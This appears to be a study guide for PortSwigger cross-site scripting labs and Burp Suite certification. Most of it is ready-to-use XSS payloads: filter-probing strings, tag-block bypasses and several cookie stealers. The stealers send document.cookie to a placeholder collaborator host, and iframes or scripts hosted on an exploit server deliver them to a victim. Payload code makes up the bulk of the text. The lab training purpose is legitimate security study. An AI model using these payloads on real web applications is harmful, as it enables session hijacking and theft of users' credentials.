# What is XSS
-  XSS occurs when user inputted data in insecurely included in the HTTP response by the Web Server.
- There are different types of XSS namely, reflected XSS, stored XSS and DOM based XSS.

# What is XSS context
The XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.
# Cross-site scripting contexts
When testing for [reflected](https://portswigger.net/web-security/cross-site-scripting/reflected) and [stored](https://portswigger.net/web-security/cross-site-scripting/stored) XSS, a key task is to identify the XSS context:
- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.
# Labs
## Lab 1: Stored XSS into HTML context with nothing encoded
```
<script>alert(1)</script>
```
### XSS Resources

> XSS Resources pages to lookup payloads for **tags** and **events**.

- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)
- [HackTheBox CPTS Study notes on XSS](https://github.com/botesjuan/cpts-quick-references/blob/main/module/Cross-site-scripting-xss.md)

> CSP Evaluator tool to check if content security policy is in place to mitigate XSS attacks. Example is if the `base-uri` is missing, this vulnerability will allow attacker to use the alternative exploit method described at [Upgrade stored self-XSS](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#upgrade-stored-self-xss).

- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

> When input field maximum length is at only 23 character in length then use this resource for **Tiny XSS Payloads**.

- [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)

> Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS [cookie stealer payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md).

```js
document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
```
### Identify allowed Tags

> Basic XSS Payloads to _**identify**_ application security filter controls for handling data received in HTTP request.

```html
<img src=1 onerror=alert(1)>
```

```html
"><svg><animatetransform onbegin=alert(1)>
```

```
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

> Submitting the above payloads may give response message, _**"Tag is not allowed"**_ due to Web Application Firewall (WAF) blocking injections. Then _**identify**_ allowed tags using [PortSwigger Academy Methodology](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked).

> URL and Base64 online encoders and decoders

- [URL Decode and Encode](https://www.urldecoder.org/)
- [BASE64 Decode and Encode](https://www.base64encode.org/)

> This lab gives great **Methodology** to _**identify**_ allowed HTML tags and events for crafting POC XSS.

> Host **iframe** code on exploit server and deliver exploit link to victim.

```html
<iframe src="https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
```

[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

> In below sample the tag **Body** and event **onresize** is the only allowed, providing an injection to perform XSS.

```js
?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

> This example show the **Body** and event **onpopstate** is not blocked.

```js
?search=%22%3E%3Cbody%20onpopstate=print()>
```

[PortSwigger Cheat-sheet XSS Example: onpopstate event](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)

> Below JavaScript is hosted on exploit server and then deliver to victim. The `code` is an iframe doing **onload** and the search parameter is vulnerable to **onpopstate**.

```js
<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie>"></iframe>
```

### Bypass Blocked Tags
> Application controls give message, _**"Tag is not allowed"**_ when inserting basic XSS payloads, but discover SVG mark-up allowed using above [methodology](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#identify-allowed-tags). This payload steal my own session cookie as POC.

```html
https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
```

> Place the above payload on exploit server and insert URL with search value into an `iframe` before delivering to victim in below code block.

```html
<iframe src="https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
</iframe>
```

[![svg animatetransform XSS](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/svg-animatetransform-xss.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/svg-animatetransform-xss.png)

[PortSwigger Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)

### XSS Assign protocol

> Lab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the **Assignable protocol with location** `javascript` exploit _**identified**_ by [PortSwigger XSS research](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location). In the payload is the `%0a` representing the ASCII newline character.

```html
<script>location.protocol='javascript';</script>#%0adocument.location='http://OASTIFY.COM/?p='+document.cookie//&context=html
```

[![XSS protocol location](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xss-protocol-location.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xss-protocol-location.png)
[PortSwigger Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
### Custom Tags not Blocked

> Application respond with message _**"Tag is not allowed"**_ when attempting to insert XSS payloads, but if we create a custom tag it is bypassed.

```html
<xss+id=x>#x';
```

_**Identify**_ if above custom tag is not block in search function, by observing the response. Create below payload to steal session cookie out-of-band.

```
<script>
location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1>#x';
</script>
```

> **Note:** The custom tag with the ID `x`, which contains an **onfocus** event handler that triggers the `document.location` function. The **HASH** `#` character at the end of the URL focuses on this element as soon as the page is loaded, causing the payload to be called. Host the payload script on the exploit server in `script` tags, and send to victim. Below is the same payload but **URL-encoded** format.

```
<script>
location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```

[![Custom XSS tag](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/custom-xss-tag.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/custom-xss-tag.png)

[PortSwigger Lab: Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

[z3nsh3ll - explaining custom tags for XSS attacks](https://youtu.be/sjs6RS7lURk)
### OnHashChange

> Below iframe uses **HASH** `#` character at end of the URL to trigger the **OnHashChange** XSS cookie stealer.

```js
<iframe src="https://TARGET.net/#" onload="document.location='http://OASTIFY.COM/?cookies='+document.cookie"></iframe>
```

> Note if the cookie is secure with **HttpOnly** flag set enabled, the cookie cannot be stolen using XSS.

> PortSwigger Lab payload perform print.

```js
<iframe src="https://TARGET.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

> Note: _**Identify**_ the vulnerable jquery 1.8.2 version included in the `source code` with the CSS selector action a the **hashchange**.

[![Hashchange](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/hashchange.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/hashchange.png)

[PortSwigger Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

[Crypto-Cat: DOM XSS in jQuery selector sink using a hashchange event](https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md)
### Reflected String XSS

> Submitting a search string and reviewing the `source code` of the search result page, the JavaScript string variable is _**identified**_ to reflect the search string `tracker.gif` in the `source code` with a variable named `searchTerms`.

```html
<section class=blog-header>
	<h1>0 search results for 'fuzzer'</h1>
	<hr>
</section>
<section class=search>
	<form action=/ method=GET>
		<input type=text placeholder='Search the blog...' name=term>
		<button type=submit class=button>Search</button>
    </form>
    </section>
	<script>
    var searchTerms = 'fuzzer';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

[![JavaScript string with single quote and backslash escaped](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/javascript-string-reflection.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/javascript-string-reflection.png)
> Using a payload `test'payload` and observe that a single quote gets backslash-escaped, preventing breaking out of the string.

```js
</script><script>alert(1)</script>
```

> Changing the payload to a cookie stealer that deliver the session token to Burp Collaborator.

```html
</script><script>document.location="https://OASTIFY.COM/?cookie="+document.cookie</script>
```

[![collaborator get cookies](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/collaborator-get-cookies.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/collaborator-get-cookies.png)

> When placing this payload in `iframe`, the target application do not allow it to be embedded and give message: `refused to connect`.

[PortSwigger Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)

> In BSCP exam host the below payload on exploit server inside `<script>` tags, and the search query below before it is URL encoded.

```
</ScRiPt ><img src=a onerror=document.location="https://OASTIFY.COM/?biscuit="+document.cookie>
```

> Exploit Server hosting search term reflected vulnerability that is send to victim to obtain their session cookie.

```html
<script>
location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
</script>
```

> The application gave error message `Tag is not allowed`, and this is bypassed using this `</ScRiPt >`.

### Reflected String Extra Escape

> See in `source code` the variable named `searchTerms`, and when submitting payload `fuzzer'payload`, see the single quote is backslash escaped, and then send a `fuzzer\payload` payload and _**identify**_ that the backslash is not escaped.

```
\'-alert(1)//  

fuzzer\';console.log(12345);//  

fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//
```

> Using a single **backslash**, single quote and **semicolon** we escape out of the JavaScript string variable, then using back ticks to enclose the `document.location` path, allow for the cookie stealer to bypass application protection.

```
\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//
```

> With help from Trevor I made this into cookie stealer payload, using back ticks. Thanks Trevor, here is his Youtube walk through [XSS JavaScript String Angle Brackets Double Quotes Encoded Single](https://youtu.be/Aqfl2Rj0qlU?t=598)

[![fail-escape](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/fail-escape.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/fail-escape.png)
[PortSwigger Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)